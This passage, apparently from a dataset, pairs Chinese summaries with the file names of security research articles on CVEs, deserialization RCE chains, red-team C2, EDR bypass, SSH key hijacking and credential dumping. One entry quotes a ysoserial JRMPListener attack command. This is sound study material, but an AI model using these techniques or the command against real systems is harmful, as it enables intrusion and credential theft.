        "FileName": "9834-Django CVE-2021-35042 order_by SQL注入分析.pdf"
    },
    {
        "page_content": "本文档探讨了 Java 远程方法调用 (RMI)、Java 命名和目录接口 (JNDI) 以及 Java 远程方法协议 (JRMP) 的概念。它解释了为什么使用 InitialContext lookup 一个 JNDI 的 rmi 或 ldap 服务会导致自身被反序列化 RCE，为什么 Registry bind 暴露一个服务对象到 RmiRegistry 会导致 Registry 服务自身被反序列化 RCE，以及为什么使用 JRMP 能互相对打。",
        "FileName": "7079-基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI.pdf"
    },
    {
        "page_content": "该文档介绍了 PbootCMS 中的一个任意代码执行漏洞，该漏洞允许攻击者通过在站点信息中插入恶意代码来执行任意 PHP 代码。该漏洞是由于 ParserController.php 中 parserIfLabel 函数对 if 标签解析时安全检验不全面造成的，攻击者可以通过在函数名和括号之间插入控制字符或结合 call_user_func 函数和请求包的 header 头来绕过过滤并执行任意代码。",
        "FileName": "7918-PbootCMS任意代码执行.pdf"
    },
    {
        "page_content": "该文档详细介绍了渗透测试中利用 .git 泄露漏洞和代码分析绕过目录限制上传任意文件的过程，重点在于利用错误日志功能进行回显注入，以及通过构造特殊文件名绕过上传限制，最终成功获取 shell。",
        "FileName": "7052-渗透测试实战（一）.pdf"
    },
    {
        "page_content": "该文档分析了利用 Egghunter 对缓冲区空间的 GTER 命令进行利用的尝试。通过模糊处理和偏移量识别，确定了 EIP 被 41396541 覆盖，偏移量为 147 字节。通过进一步修改代码，EIP 被 4 个 B 覆盖，偏移量正确。然而，ESP 仅被 20 个 C 字符覆盖，不足以容纳 shellcode。通过识别坏字符并使用 egghunter，将程序流重定向到 A 字符的起点。最后，通过使用其他命令，将 shellcode 存储在内存中，并通过 egghunter 执行，在目标机上打开了一个监听端口。",
        "FileName": "12302-利用Egghunter对缓冲区空间的GTER命令进行利用.pdf"
    },
    {
        "page_content": "本文介绍了如何利用反射 DLL 技术来增强 Cobalt Strike 的功能，包括使用 C/C++ 和 Golang 语言编写反射 DLL，以及在 Cobalt Strike 中使用 Aggressor 脚本加载和执行这些 DLL。",
        "FileName": "7997-利用ReflectiveDLL来武装你的Cobalt Strike.pdf"
    },
    {
        "page_content": "本文介绍了如何在内网渗透中利用 Cobalt Strike 的 VPN 和端口转发功能，以及 PortBender 工具，解决内网中继攻击中遇到的问题，包括无法直接转发 445 端口流量和驱动注入导致 SMB 服务崩溃等，并通过一个简单的域环境演示了攻击过程。",
        "FileName": "12500-实战下的内网中继攻击问题.pdf"
    },
    {
        "page_content": "CVE-2021-44515 是 Zoho ManageEngine Desktop Central 中的一个身份验证绕过漏洞，允许攻击者通过上传特制的 ZIP 文件来执行远程代码。该漏洞利用了 XSSFilter 中的逻辑绕过，允许攻击者上传 ZIP 文件并将其加载到类加载器中，从而在启动过程中执行恶意代码。",
        "FileName": "10638-CVE-2021-44515 Zoho ManageEngine Desktop Central Pre-auth RCE.pdf"
    },
    {
        "page_content": "CVE-2020-0688 漏洞利用 Microsoft Exchange 服务器中加密密钥创建不当的缺陷，允许攻击者通过发送特殊处理的电子邮件触发远程代码执行，从而在 Exchange Control Panel Web 应用程序上执行任意 .NET 代码。该漏洞影响 Exchange 2010、2013、2016 和 2019 的所有版本，可以通过生成一个包含恶意有效负载的 URL 并将其发送给目标服务器来利用。",
        "FileName": "7321-CVE-2020-0688_微软EXCHANGE服务的远程代码执行漏洞复现.pdf"
    },
    {
        "page_content": "该文档重点介绍了红队 C2 服务器的基础构建，包括修改默认配置、隔离不同 C2 通信、使用 Malleable C2 配置自定义流量、设置 HTTP-config 块、配置 HTTPS 证书以及使用 c2lint 程序检查配置文件语法。通过这些措施，红队可以增强 C2 服务器的隐蔽性和持久性，从而提高攻击的成功率。",
        "FileName": "7758-红队-C2 Server基础构建.pdf"
    },
    {
        "page_content": "该文档详细描述了作者在渗透测试中通过信息收集、弱口令攻击、源码泄露、SQL注入、密码复用和VPN访问等一系列步骤成功渗透到目标企业的内网，展示了外网打点的思路和流程。",
        "FileName": "11366-[有手就行]记一次艰难的外网打点.pdf"
    },
    {
        "page_content": "Kerberos 是一种网络身份验证协议，它使用密钥加密技术为客户端/服务器应用程序提供强身份验证。在 Kerberos 协议中，有三个主要角色：客户端（用户）、服务器（提供服务）和 KDC（密钥分发中心）。KDC 负责分发密钥，在域林中，KDC 服务通常安装在域控制器中。Kerberos 认证过程由客户端向 KDC 发送认证服务请求开始，KDC 验证客户端身份并返回 TGT（票据授予票据）。客户端使用 TGT 向 KDC 请求服务票据，KDC 验证 TGT 并返回 TGS（服务票据）。客户端使用 TGS 向服务器请求服务，服务器验证 TGS 并向 KDC 询问客户端是否有权访问服务。如果客户端有权访问服务，服务器就会返回响应。",
        "FileName": "9309-内网渗透协议学习.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2021-45232 漏洞，该漏洞影响 Apache APISIX Dashboard 2.7 - 2.10 版本，原因是 Manager API 中的错误导致绕过身份验证。漏洞修复涉及删除不安全的过滤器、添加身份验证和限制 IP 访问。",
        "FileName": "10732-CVE-2021-45232漏洞分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何使用 Acunetix 漏洞扫描器发现 Google 中的一个跨站脚本 (XSS) 漏洞。研究人员使用该扫描器扫描了 Google 的各种服务，并发现了该漏洞。他们分析了 HTTP 响应，了解了漏洞的原理，并构造了一个合适的有效负载。该漏洞影响了 Google 的多个域，但可以通过更改一行代码来修复。该漏洞于 2019 年 12 月 27 日报告，并于 2020 年 1 月 8 日修复，研究人员获得了 5000 美元的赏金。",
        "FileName": "7283-Bug Bounty利用Acunetix发现Google XSS.pdf"
    },
    {
        "page_content": "该文档分析了某 OA 系统中任意文件上传漏洞的成因，该漏洞利用了系统对 URL 后缀为 .css 的请求进行白名单验证的机制，绕过了访问控制规则。通过逆向分析，发现系统在初始化安全防护规则时，将 URL 后缀为 .css 的请求排除在防护规则之外，从而导致了漏洞的产生。利用该漏洞，攻击者可以绕过权限访问，上传任意文件。",
        "FileName": "9581-某OA接口绕过后任意文件上传分析.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用反序列化漏洞在 WMCTF2020 webweb 挑战中实现远程代码执行 (RCE)。它详细解释了如何通过控制反序列化输入来触发 __destruct() 方法，并利用 __call() 方法将可控变量作为系统命令的参数，最终达到 RCE 的目的。",
        "FileName": "9220-从WMCTF2020 webweb学反序列化.pdf"
    },
    {
        "page_content": "本教程介绍了如何使用 Frida 框架来 hook Android 原生方法，特别是 C/C++ 函数。它提供了两种方法：通过 Java API 替换 Java 层的实现，以及直接修改 C 实现。该教程涵盖了环境设置、Frida 安装、JavaScript 脚本编写和结果验证，并提供了示例代码和详细说明。",
        "FileName": "7729-How to hook Android Native methods with Frida (Noob Friendly).pdf"
    },
    {
        "page_content": "该文档介绍了 hackebds 工具，该工具用于生成各种架构的后门和反向 shell 代码，并提供设备漏洞信息和 POC。它支持命令行生成后门和外壳代码，并具有轻便、高效和快速的特点。",
        "FileName": "12054-各种架构ELF后门生成工具.pdf"
    },
    {
        "page_content": "该文档介绍了 Node.js 的主题和内容，包括其定义、应用、特性、大小写、弱类型、console.log()、eval()、process、child_process.exec()、spawn()、fork()、setTimeout()、setInterval()、function()、require()、settimeout()、setinterval()、function()、require()、操作函数、原型链污染、反弹 shell、文件操作、step1 prototype 和 proto、step2 我们对原型链污染进⾏污染的⽬的、配合 ejs 模板引擎实现 RCE、配合 jade 模板引擎实现 RCE、web 334、web 335、web 336、web 337、web338、web339、[⽹鼎杯  2020  ⻘⻰组]notes、[GYCTF2020]Ez_Express、www.zip、[ 湖湘杯  2021 ﬁnal]vote。",
        "FileName": "12383-nodejs全覆盖.pdf"
    },
    {
        "page_content": "该文档探讨了恶意软件绕过 EDR（终端检测和响应）系统的方法，EDR 通常在内核空间中操作以检测恶意活动。作者提出了一种新技术，称为“Ruy Lopez”，它允许恶意软件在 EDR DLL 加载之前进入远程进程并阻止其加载，从而欺骗 EDR 系统。该技术利用了用户空间钩子检测技术，并通过在 NtCreateSection 函数上放置钩子来实现，该函数负责创建进程中的节。作者还讨论了该技术的潜在用途，例如绕过设备保护/信任检查和阻止自定义 AMSI 提供程序 DLL 的加载。",
        "FileName": "12678-浅谈EDR绕过(猫&鼠还是象棋).pdf"
    },
    {
        "page_content": "xml2js 0.4.23 版本中存在原型污染漏洞，该漏洞允许攻击者编辑或添加对象属性，从而可能导致权限提升或其他恶意行为。该漏洞是由不正确验证传入 JSON 键导致的，允许编辑 `__proto__` 属性。",
        "FileName": "12497-漏洞分析 - xml2js 0.4.23 Prototype Pollution.pdf"
    },
    {
        "page_content": "本文分析了 JavaScript 原型链污染在 Jade 模板引擎中的利用链挖掘，通过覆盖编译过程中可控变量，在编译解析阶段注入恶意代码，从而实现远程代码执行。",
        "FileName": "7025-再探 JavaScript 原型链污染到 RCE.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何通过分析设备产品中的 JS 文件来挖掘 RCE 漏洞。研究人员通过信息收集和目录爆破技术，发现了敏感信息和潜在的漏洞点。他们利用任意文件读取漏洞和远程命令执行漏洞，成功获取了目标设备的权限。该文档提供了详细的步骤和代码示例，展示了如何利用这些漏洞来实现远程代码执行。",
        "FileName": "10371-某设备产品漏洞挖掘-从JS文件挖掘RCE.pdf"
    },
    {
        "page_content": "Kubernetes API Server 作为集群管理入口，提供 API 控制集群内部，默认使用 8080（不安全端口）和 6443（安全端口），其中 8080 无需认证，6443 需要认证并有 TLS 保护。如果 Insecure-port 在生产环境中暴露，可利用此端口攻击集群。此外，配置错误（如匿名访问 + 绑定高权限角色）、历史提权漏洞（如 CVE-2018-1002105）和 RBAC 配置不当也存在提权风险。",
        "FileName": "11495-K8s 之 ApiServer 组件风险.pdf"
    },
    {
        "page_content": "CSRF（跨站点请求伪造）是一种网络攻击，攻击者可以利用受害者的身份验证信息，以受害者的名义向目标网站发送恶意请求，从而盗取敏感信息、执行恶意操作等。CSRF攻击的原理是攻击者通过诱导受害者访问恶意网站或点击恶意链接，在受害者不知情的情况下，向目标网站发送伪造的请求，而目标网站会误以为该请求是受害者本人发出的，从而执行攻击者的恶意操作。",
        "FileName": "7450-浅谈CSRF漏洞.pdf"
    },
    {
        "page_content": "该文档主要介绍了在梦中构建虚拟渗透场景，通过《内网安全攻防渗透测试指南》一书内容，记录常规域渗透的流程和过程中遇到的问题，以及作者自己的思考。文档从初始环境、初步信息收集、侦查域环境、获取域内用户和管理员信息、查找域管理进程、自动化收集域信息、搭建加密隧道、寻找靶标终端、cs批量上线、域环境权限维持等方面详细介绍了域渗透的流程和技巧。",
        "FileName": "8656-梦中初探域渗透流程.pdf"
    },
    {
        "page_content": "该文档介绍了在 Linux 系统上使用 KVM（内核虚拟机）进行虚拟化的过程，包括环境部署、CMake 设置、KVM 编译、LibKVM 源码分析和调试。它提供了逐步指导，涵盖了从安装依赖项到加载内核模块和远程调试的各个方面。",
        "FileName": "9587-KVM循序渐进耳之基础篇.pdf"
    },
    {
        "page_content": "该文档介绍了 OAuth 2.0 授权协议，包括其工作流程、授权方法（授权码、简化、密码、客户端凭证）以及安全漏洞。它还提供了利用 OAuth 客户端和服务端中的漏洞的示例，包括 CSRF 攻击、授权代码泄露和开放式重定向。",
        "FileName": "11585-OAuth 2.0利用方式.pdf"
    },
    {
        "page_content": "本文主要介绍了利用 Redis 未授权和弱口令漏洞进行渗透的多种方式，包括写入 Webshell、写入 SSH 公钥、写入计划任务、加载模块执行命令和主从复制 RCE。这些方法需要不同的前提条件和环境，并且在不同的操作系统和 Redis 版本中可能存在差异。",
        "FileName": "8018-redis数据库在渗透中的利用.pdf"
    },
    {
        "page_content": "文档分析了2023年春秋杯春季赛Pytrans Writeup，该比赛考察了pyinstaller打包文件复原、pyc反编译、python机器码反编译、十元一次方程组求解和迷宫求解等知识点。通过对文档的分析，可以了解到比赛的题目内容和解题思路，以及涉及到的相关知识点。",
        "FileName": "12558-2023 年春秋杯春季赛 Pytrans Writeup.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 Volatility 工具在 VMware vCenter ESXi 中获取 Windows 锁屏服务器的哈希值，并提供了使用 Python 2 和 Python 3 版本的 Volatility 的详细步骤。它还讨论了在没有互联网连接的情况下下载必需的符号文件的方法，并提供了使用 pdbconv.py 脚本的说明。",
        "FileName": "11949-vCenter获取锁屏Hash之volatility.pdf"
    },
    {
        "page_content": "该文档描述了帆软（FineReport）V9中存在的任意文件覆盖漏洞，该漏洞允许攻击者覆盖现有文件或创建新文件，包括JSP文件，从而获得服务器权限。漏洞的利用涉及通过特定参数传递恶意SVG文件，该文件包含用于覆盖目标文件的木马代码。文档提供了漏洞的详细分析、影响范围、利用方法和修复建议。",
        "FileName": "9578-帆软（FineReport) V9任意文件覆盖漏洞.pdf"
    },
    {
        "page_content": "该文档探讨了 Java ClassLoader 的概念，它负责动态加载 Java 类到 JVM 中。文档介绍了不同类型的 ClassLoader，包括 BootstrapClassLoader、ExtensionClassLoader、AppClassLoader 和 UserDefineClassLoader。它还解释了双亲委派机制，该机制规定每个 ClassLoader 首先尝试将加载任务委托给其父加载器。最后，文档提供了使用自定义 ClassLoader 加载和执行字节码的示例，展示了如何利用 ClassLoader 的功能。",
        "FileName": "9050-Java安全02-从ClassLoader到冰蝎Java篇.pdf"
    },
    {
        "page_content": "该文档对 MKCMS 代码审计进行了总结，重点关注了几个关键漏洞，包括验证码重用、前台注入、任意用户密码找回和备份文件路径可猜测。这些漏洞允许攻击者绕过安全措施，访问敏感信息，甚至在系统上执行任意代码。",
        "FileName": "7580-MKCMS代码审计小结.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 Fastjson 反序列化漏洞在 Spring MVC 中注入内存马，通过 JNDI 下载恶意类文件，触发恶意类的构造函数中的代码，从而注入控制器内存马。文档详细介绍了漏洞环境搭建、注入内存马、注册控制器、修改回显代码等步骤，并提供了完整的代码示例。",
        "FileName": "10467-利用Fastjson注入Spring内存马.pdf"
    },
    {
        "page_content": "**主题：** WellCMS 2.0 Beta3 后台任意文件上传漏洞\n\n**内容：** 该漏洞允许攻击者通过修改上传文件类型为 \"php\"，将恶意 PHP 代码上传到 WellCMS 2.0 Beta3 后台，从而获得 webshell 权限。漏洞利用过程涉及修改上传文件包中的 \"filetype\" 参数，构造 base64 编码的 PHP 代码作为 \"data\" 参数，并绕过文件类型检查。成功上传后，攻击者可以访问恶意 PHP 文件，执行任意代码并控制服务器。",
        "FileName": "7284-WellCMS 2.0 Beta3 后台任意文件上传.pdf"
    },
    {
        "page_content": "本文探讨了 Azure AD 环境与本地环境之间的差异，以及如何将用于本地环境的横向移动技术应用于 Azure AD 环境。尽管 Azure AD 不支持 Kerberos 和 NTLM 认证，但它使用 NEGOEX PKU2U 协议在加入 Azure AD 的计算机之间进行身份验证。通过利用 Mimikatz 转储客户端证书和私钥，攻击者可以模拟用户并进行横向移动。",
        "FileName": "7705-Azure AD 横向移动 - 1.pdf"
    },
    {
        "page_content": "该文档介绍了一种利用 Redis 未授权访问和 Shiro-Redis 反序列化漏洞来实现远程代码执行 (RCE) 的技术。攻击者通过修改存储在 Redis 中的 Shiro 会话数据，诱使 Shiro 读取并反序列化恶意数据，从而触发反序列化漏洞并获得目标站点的 IP 地址。",
        "FileName": "11198-redis未授权到shiro反序列化.pdf"
    },
    {
        "page_content": "**主题：** Spring Boot 2.x Actuator 配置不当导致的 RCE 漏洞\n\n**内容：** 该文档详细介绍了如何利用 Spring Boot 2.x 中 HikariCP 数据库连接池的配置不当来执行远程代码执行 (RCE)。它解释了如何使用 H2 数据库引擎创建自定义函数，然后通过修改环境变量来触发数据库连接，从而执行任意命令。文档还提供了绕过 WAF 过滤器的技术，并讨论了命令执行上下文的限制。",
        "FileName": "7480-Spring Boot 2.x Actuator配置不当RCE漏洞复现.pdf"
    },
    {
        "page_content": "本文探讨了无回显命令执行的利⽤方法，包括通过审计代码、利用延时、HTTP 请求和 DNS 请求来判断命令是否可执行，以及通过执行命令、写 webshell、外部下载 webshell、通过 dnslog 带出数据、反弹 shell、msf 反向回连、使用 nc 和 curl 上传文件读取源码等方法来利用无回显命令执行漏洞。",
        "FileName": "8125-浅谈PHP无回显命令执行的利用.pdf"
    },
    {
        "page_content": "该文档分析了 CakePHP 框架中的反序列化漏洞，展示了如何利用该漏洞在不同版本的 CakePHP 中执行任意命令。该漏洞利用了 __destruct 和 __wakeup 方法，以及 __call 方法和可控参数，最终通过 ServerShell 类或 ServerCommand 类中的 main 方法执行命令。",
        "FileName": "9995-CakePHP反序列化POP链挖掘.pdf"
    },
    {
        "page_content": "1.登录 针对 RMI 服务的九重攻击  -  下 针对 RMI 服务的九重攻击  -  下 啦啦 0 咯咯   /  2020-07-02 09:41:13  /  浏览数  20334 字数： 1w5 推荐阅读时间： >2h 再看下 RMI 反序列化攻击的总结图： 如果觉得有什么出⼊，喷就完事了； 同时觉得本⽂对你有帮助， 也请留⾔、评论、关注、⼀键三连⽀持你喜欢的 up 主！你的点赞是我更新的动⼒！如果这期点赞超过 20w ，下篇⽂章直播开 ..... 咳 ... 在上篇中已经讲述 针对已知 RMI 接⼝的三种攻击⽅式 与 针对 RMI 层（ RMI 注册端、 RMI 服务端） /DGC 层 ，得出了部分结论。 ⽽在下篇中将重点讲述 绕过 JEP290 的引⼊ JRMP 的利⽤⽅式 ，这就很好玩了，指出了别的⽼哥的错误之处，找到了别⼈没提及的 骚姿势，复现分析了⽼外的绕过⽅式。 上下篇的⼩结论是沿⽤的，建议配合⻝⽤；⽂中实验代码、环境及⼯具均已上传 github 。 此外安利下 ysomap ，如果没有意外的话，之后会陆续把这些攻击⽅式都移植过去。 在上篇中我们所有攻击⽅式都给 JEP290 给⼲掉了，当然出了参数利⽤的⽅式，但是那种利⽤局限性太强了。来看看绕过 JEP290 的 攻击⽅式。 前⾔ 利⽤ JRMP 反序列化绕过 JEP290先进⾏攻击演示： 1 .  使⽤ github 中的 \t ServerandRegister.java \t 作为受害者靶机 2 .  运 ⾏ \t java\t-cp\tF:\\BanZ\\java\\ysoserial.jar\tysoserial.exploit.JRMPListener\t1199\tCommonsCollections5\t\"calc\" \t 作 为攻击者⾃实现的 JRMP 服务端 3 .  运⾏ github 中的 \t Bypass290.java \t 作为攻击代码 再来讲绕过原理的前置知识： 这其实就是 ysoserial.exploit.JRMPListener 模块的攻击逻辑 其实之前标题为 DGC 服务端打 DGC 客户端，在别的⽂章评论区如此说的时候，被 ⽼哥 指出来不对：这⾥ 的漏洞触发跟 DGC 没关系。 实际去仔细看了调⽤栈的确不经过 DGC ，由于⾃⼰看的时候是从",
        "FileName": "7932-针对RMI服务的九重攻击 - 下.pdf"
    },
    {
        "page_content": "本文探讨了通过域名发现攻击面的技术方向，分析了三种方法：同一路由器 DNS 服务器、Whois 信息和 Google Analytics ID。每种方法的可信度和可行度都进行了评估，并提供了其他网站特征 ID 信息、备案号查询、被动收集和 DNS 数据解析等替代方法。",
        "FileName": "8674-浅论《关于域名攻击面发现》技术方向的想法.pdf"
    },
    {
        "page_content": "该文档介绍了 DVWA 靶场中的 SQL 盲注漏洞，包括低、中、高和不可能四个级别。低级别漏洞允许通过布尔盲注判断数据库长度、库名、表名和字段名。中级别漏洞通过抓包修改参数绕过前端控制。高级别漏洞通过修改 cookie 参数绕过基于时间的盲注和 LIMIT 1 限制。不可能级别漏洞采用 PDO 技术和 Anti-CSRFtoken 机制有效防御 SQL 注入。",
        "FileName": "12044-DVWA靶场之SQL Injection (Blind)学习分享.pdf"
    },
    {
        "page_content": "该文档重点介绍了 Node.js 中常见的安全漏洞，包括 HTTP 头设置、代码执行、XSS、SSRF、SQL 注入、文件上传、npm 模块漏洞、目录穿越和 VM 逃逸。它提供了示例代码和解释，说明如何利用这些漏洞，并建议使用安全措施来缓解这些风险。",
        "FileName": "8407-Node.js Vuln's Analyse.pdf"
    },
    {
        "page_content": "该文档介绍了使用 PHP 语言编写免杀 Webshell 的技术，包括利用反射类、可变函数、trait 特性以及静态调用非静态函数等技巧，并提供了具体的代码示例和流量分析，帮助读者绕过 WAF 检测，实现命令执行。",
        "FileName": "9218-Webshell免杀之蚁剑连接.pdf"
    },
    {
        "page_content": "该文档分析了 MIP 建站系统 v5.0.5 中的 SSRF 漏洞，该漏洞允许攻击者通过 POST 请求读取系统任意文件。漏洞源于代码中未对用户输入的 $postAddress 参数进行过滤，导致攻击者可以构造恶意请求，将 $postAddress 参数设置为本地文件路径，从而读取敏感信息。",
        "FileName": "7431-MIP建站系统v5.0.5 SSRF漏洞分析.pdf"
    },
    {
        "page_content": "本文从攻击者的视角分析了Kubernetes (K8S) 集群的安全威胁，重点介绍了对 K8S 组件、节点对外服务、业务 pod 的攻击，以及容器逃逸。这些攻击点包括 API Server 未授权访问、etcd 未授权访问、kubelet 未授权访问、kube-proxy 不安全配置、攻击节点对外服务、攻击业务 pod、容器逃逸等。",
        "FileName": "11652-【云攻防系列】从攻击者视角聊聊K8S集群安全（上）.pdf"
    },
    {
        "page_content": "该文档详细介绍了 tcache 机制，该机制是 glibc 2.26 中引入的一种技术，用于提高堆管理器的性能，但它舍弃了许多安全检查，从而导致了多种利用方式。文档分析了 tcache 的工作原理、数据结构和绕过 tcache 执行流程的各种技术，包括绕过 tcache bin、利用 unsorted bin、chunk extend、tcache poisoning、tcache house of spirit、tcache stashing unlink attack 等。",
        "FileName": "12554-Tcache attack.pdf"
    },
    {
        "page_content": "Ruby Sanitize 库的 RELAXED 配置存在安全漏洞，允许攻击者通过利用 <style> 元素中的注释符绕过 HTML 清理，从而导致 XSS 攻击。该漏洞已在版本 5.2.1 中修复，建议用户升级到最新版本。",
        "FileName": "8074-Ruby Sanitize5.2.1的HTML sanitization绕过.pdf"
    },
    {
        "page_content": "                    ## 文档\n                    **主题：** 分析 Linux 中的 seccomp\n\n                    **内容：**\n                    seccomp（全称 securecomputing mode ）是 linux kernel ⽀持的⼀种安全机制。在 Linux 系统⾥，⼤量的系统调⽤（ systemcall ）直 接暴露给⽤户态程序。但是，并不是所有的系统调⽤都被需要，⽽且不安全的代码滥⽤系统调⽤会对系统造成安全威胁。通过 seccomp ，我们限制程序使⽤某些系统调⽤，这样可以减少系统的暴露⾯，同时是程序进⼊⼀种 “ 安全 ” 的状态。\n\n                    seccomp 过滤模式允许开发⼈员编写 BPF 程序来确定是否允许给定的系统调⽤，基于系统调⽤号和参数（寄存器）值进⾏过滤。当使⽤ seccomp() 或 prctl() 对进程施加 seccomp 过滤器时，需要提前将编写好的 BPF 程序安装到内核，之后每次系统调⽤都会经过该过滤器。⽽且此过程是不可逆的，   因为安装过滤器实际上是声明任何后续执⾏的代码都不可信。\n\n                    BPF 在 1992 年的 tcpdump 程序中⾸次提出， tcpdump 是⼀个⽹络数据包的监控⼯具，   但是由于数据包的数量很⼤，⽽且将内核空间捕获到的数据包传输到⽤户空间会带来很多不必要的性能损耗，所以要对数据包进⾏过滤，只保留感兴趣的那⼀部分，⽽在内核中进⾏过滤更有效。\n\n                    BPF  就是提供了⼀种进⾏内核过滤的⽅法，因此⽤户空间只需要处理经过 内核过滤的后感兴趣的数据包   。\n\n                    BPF 定义了⼀个可以在内核内实现的虚拟机 (VM) 。该虚拟机有以下特性：\n\n                    * 简单指令集\n                    * 小型指令集\n                    * 所有的指令⼤⼩相同\n                    * 实现过程简单、快速\n                    * 只有分⽀向前指令\n                    * 程序是有向⽆环图 (DAGs) ，没有循环\n                    * 易于验证程序的有效性\n                    * / 安全性\n\n                    简单的指令集 ⇒ 可以验证操作码和参数\n                    可以检测死代码\n                    程序必须以  Return  结束\n                    BPF 过滤器程序仅限于 4096 条指令\n                    BPF  程序在 Linux 内核中主要在  filter.h  和  bpf_common.h  中实现，主要的数据结构包括以下⼏个：\n\n                    Linux v5.18.4/include/uapi/linux/filte.h  ->  sock_fprog struct\n                    ```",
        "FileName": "11480-Seccomp、BPF与容器安全.pdf"
    },
    {
        "page_content": "本文档探讨了如何使用 Python 获得一个完整的交互式 shell，它介绍了使用 `script /dev/null` 替代 Python 的 pty 模块来创建终端，并提供了优化后的 Python 客户端脚本，该脚本可以接收一个完整的交互式 shell，无需按下两次 Ctrl+D 或使用 reset 命令。",
        "FileName": "7721-关于一次python获得完整交互式shell的研究.pdf"
    },
    {
        "page_content": "CVE-2020-25291 漏洞存在于金山 WPS Office 中，该漏洞源于 Qt 模块中 PNG 图像格式解析的堆损坏，攻击者可利用该漏洞在当前用户上下文中执行任意代码或导致拒绝服务。该漏洞已在 WPS Office 11.2.0.9453 版本中修复。",
        "FileName": "8502-CVE-2020-25291金山WPS Office远程堆损坏漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了 OpenSNS 中的远程命令执行 (RCE) 漏洞，该漏洞允许攻击者通过提交经过精心设计的查询参数来执行任意代码。文档详细介绍了漏洞的利用过程，包括变量覆盖、模型实例化和函数调用，并提供了利用 RCE 和 SSRF 漏洞的示例 payload。此外，文档还提到了后台任意文件下载和任意代码执行的漏洞，但这些漏洞由于权限限制而无法利用。",
        "FileName": "10013-OpenSNS RCE分析.pdf"
    },
    {
        "page_content": "该文档总结了 10 个 MySQL 报错函数，包括 floor()、extractvalue()、updatexml()、exp()、geometrycollection()、multiponint()、polygon()、multipolygon()、linestring() 和 multilinestring()。这些函数在特定条件下会触发错误，例如主键重复、XPath 格式错误、参数不满足几何数据要求等。文档提供了示例查询和报错原理，并指出某些函数受 MySQL 版本限制。",
        "FileName": "7318-Mysql报错函数小结.pdf"
    },
    {
        "page_content": "本文探讨了 VueJS 框架中存在的安全漏洞，这些漏洞可被攻击者利用来绕过防御措施并执行恶意代码。文章介绍了多种利用 VueJS 脚本小工具创建 XSS 向量的方法，这些向量可以绕过 WAF 和 CSP 等防御措施。此外，文章还提供了针对 VueJS 第 2 版和第 3 版的具体攻击向量，并讨论了这些漏洞在实际场景中的应用，例如绕过 WAF 过滤器和 CSP。",
        "FileName": "8404-使用VueJS脚本小工具规避防御.pdf"
    },
    {
        "page_content": "该文档分析了强⽹杯 2021 年线上赛 Pwn 方向的 4 种解法，这些解法利用了 notebook.ko 模块中的漏洞，通过条件竞争和 UAF 漏洞构造内核 ROP，最终实现提权。",
        "FileName": "9798-强网杯 Notebook writeup -- 4种解法.pdf"
    },
    {
        "page_content": "本文档介绍了如何使用 BCC（BPF Compiler Collection）库在 Linux 内核中使用 eBPF（Extended Berkeley Packet Filter）技术实现 SSH 密钥劫持。BCC 提供了高级工具和库，简化了 eBPF 程序的开发和部署，使开发者能够利用 eBPF 技术进行网络分析、性能调优和故障排查等任务。通过 hook 系统调用，本文档展示了如何修改缓冲区字符串，从而实现 SSH 密钥劫持，允许攻击者免密登录目标主机。",
        "FileName": "12689-使用 BCC 实现 SSH 密钥劫持.pdf"
    },
    {
        "page_content": "该文档分析了 emlog 博客系统中的三个漏洞，包括后台 SQL 注入、文件上传和模板上传。这些漏洞允许攻击者在系统中执行任意代码，从而获得对系统的完全控制。",
        "FileName": "7808-emlog博客系统的一次审计.pdf"
    },
    {
        "page_content": "FastJson 1.2.25 及后续版本引入的 checkAutoType 安全机制旨在防止 autoType 机制带来的安全隐患，通过检查 @type 字段值和匹配黑名单和白名单来过滤和处理传入的 JSON 字符串，但该机制存在缺陷，例如可以通过构造以 \"L\" 开头和 \";\" 结尾的 className 来绕过黑名单限制。",
        "FileName": "8140-FastJson checkAutoType安全机制研究.pdf"
    },
    {
        "page_content": "该文档介绍了 Jackson，一个用于 Java 对象序列化和反序列化的开源工具。它提供了 ObjectMapper.writeValueAsString() 和 ObjectMapper.readValue() 方法来实现序列化和反序列化功能，并支持多态类型绑定，以解决不同类型对象的反序列化问题。文档还讨论了 Jackson 反序列化漏洞的条件和利用方法，强调了在控制器或 setter 方法中构造恶意代码的潜在风险。",
        "FileName": "12628-Jackson反序列化.pdf"
    },
    {
        "page_content": "该文档分析了 Java 反序列化中的 Spring1 漏洞，该漏洞利用了 Spring 框架中多个类的动态代理功能，通过嵌套代理层来修改方法返回值，最终触发命令执行。",
        "FileName": "12875-Java反序列化之Spring1链分析.pdf"
    },
    {
        "page_content": "该文档介绍了从 RDP 相关的进程（svchost.exe 和 mstsc.exe）中转储 RDP 凭据的多种技术，包括内存转储、API 钩取和凭据管理器解析。这些技术可以帮助红队人员在横向移动和域接管中获取凭据。",
        "FileName": "9725-转储RDP凭据.pdf"
    },
    {
        "page_content": "该文档提供了红队渗透测试的技巧，涵盖了信息收集、SQL注入、逻辑漏洞、上传、XSS、SSRF、XXE、CSRF、内网横向移动、提权、权限维持、文件传输、内网小技巧、免杀、DLL劫持、DLL注入、委派和绕过UAC等方面。",
        "FileName": "9773-红队小技巧.pdf"
    },
    {
        "page_content": "**主题：** CSRF（跨站请求伪造）攻击\n\n**内容：** CSRF 攻击是一种网络攻击，攻击者利用受害者的已登录会话，在受害者不知情的情况下执行恶意操作。文档介绍了 CSRF 攻击的原理、成因、利用方法和防御措施，包括 GET 型、POST 型和链接型 CSRF 攻击的示例。",
        "FileName": "12866-CSRF的学习和利用.pdf"
    },
    {
        "page_content": "该文档分析了 WebLogic coherence 组件中存在的 IIOP 反序列化漏洞 (CVE-2020-14644)，该漏洞允许攻击者在无需登录的情况下通过发送恶意 IIOP 数据包执行远程任意命令。漏洞影响 WebLogic 12.2.1.3.0、12.2.1.4.0 和 14.1.1.0.0 版本。文档提供了漏洞复现代码和攻击分析，并介绍了 Javassist 和 Ysoserial 类库在攻击中的作用。",
        "FileName": "8155-Weblogic coherence组件iiop反序列化漏洞浅析 (CVE-2020-14644).pdf"
    },
    {
        "page_content": "该文档分析了两个 CTF 比赛中的题目，第一个题目涉及使用 selenium 访问网站并提取数据，第二个题目涉及使用 Flask 的 session 伪造和 LaTeX 编译 RCE。",
